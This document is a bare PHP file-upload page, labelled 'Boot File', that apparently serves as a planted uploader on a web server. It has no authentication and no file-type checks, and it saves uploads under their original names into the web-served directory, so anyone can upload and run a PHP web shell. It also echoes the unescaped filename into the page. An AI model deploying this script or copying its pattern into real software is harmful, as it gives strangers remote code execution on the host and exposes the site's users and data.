<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $uploadDir = '';

    // Check if the directory exists; if not, create it
    if (!is_dir($uploadDir)) {
        mkdir($uploadDir, 0755, true);
    }

    if (isset($_FILES['fileToUpload']) && $_FILES['fileToUpload']['error'] === UPLOAD_ERR_OK) {
        $fileName = basename($_FILES['fileToUpload']['name']);
        $targetFilePath = $uploadDir . $fileName;

        if (move_uploaded_file($_FILES['fileToUpload']['tmp_name'], $targetFilePath)) {
            echo "<p>successfully: <a href='$targetFilePath'>$fileName</a></p>";
        } else {
            echo "<p>Error: Unable to boot the file.</p>";
        }
    } else {
        echo "<p>Error: Please select a file to boot.</p>";
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title></title>
</head>
<body>
    <h1>Boot File</h1>
    <form action="" method="post" enctype="multipart/form-data">
        <label for="fileToUpload">Select file to Boot :</label>
        <input type="file" name="fileToUpload" id="fileToUpload" required>
        <button type="submit">Boot</button>
    </form>
</body>
</html>
